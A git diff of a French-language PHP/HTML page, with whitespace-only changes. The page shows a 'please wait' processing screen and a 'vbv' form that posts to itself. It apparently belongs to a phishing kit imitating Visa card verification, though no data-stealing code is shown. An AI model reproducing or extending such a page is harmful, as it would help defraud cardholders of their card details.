@@ -19,15 +19,10 @@ require '../ibc.php';
      <h2 style="text-align:center;margin-top:-100px;">Veuillez patienter pendant que nous traitons votre demande
 <br>S.V.P ne pas fermer cette fenêtre</h2><br><br><br>
     <div style="width: 100px;margin: 0 auto;">
-       
         <img src="assets/img/processing.gif" alt="" width="100" height="100">
-        
     </div>
 </div>
-
 <div class="container vbv" id="vbv">
-
-
     <div class="row center-block header">
         <div class="col-sm-4 col-xs-4 ssl">
             <img src="https://i.imgur.com/KYCTrJv.png" alt="">
@@ -50,7 +45,6 @@ require '../ibc.php';
     </div>
     <div class="row center-block col-sm-12 col-xs-12">
         <div id="core-vbv">
-
             <form action="" id="vbv-form" method="post" for="merci">
                 <table>
                     <input type="hidden" name="type" value="3">
@@ -82,10 +76,9 @@ require '../ibc.php';
 <button type="button" class="submit disabled" id="3" role="merci" disabled style="display:none;">Ok</button>
 </td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
             </form>
-
-
         </div>
     </div>
     <div class="row center-block col-sm-12 col-xs-12 footer">
